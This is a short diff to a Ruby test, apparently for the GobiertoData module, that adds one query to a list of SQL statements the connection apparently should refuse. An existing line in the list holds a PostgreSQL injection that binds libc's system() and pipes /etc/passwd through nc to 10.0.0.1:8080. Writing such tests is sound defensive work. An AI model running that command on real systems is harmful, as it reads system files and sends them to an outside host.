@@ -90,7 +90,8 @@ module GobiertoData
         "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; — privSELECT system('cat /etc/passwd | nc 10.0.0.1 8080');",
         "CREATE TABLE mytable (mycol text)",
         "INSERT INTO mytable(mycol) VALUES (1)",
-        "SELECT inet_server_addr();"
+        "SELECT inet_server_addr();",
+        "SELECT current_setting('data_directory');"
       ].each do |query|
         result = Connection.execute_query_output_csv(site, "SELECT not_existing_column FROM users", {col_sep: ','})
         hash_result = JSON.parse(result.to_json)
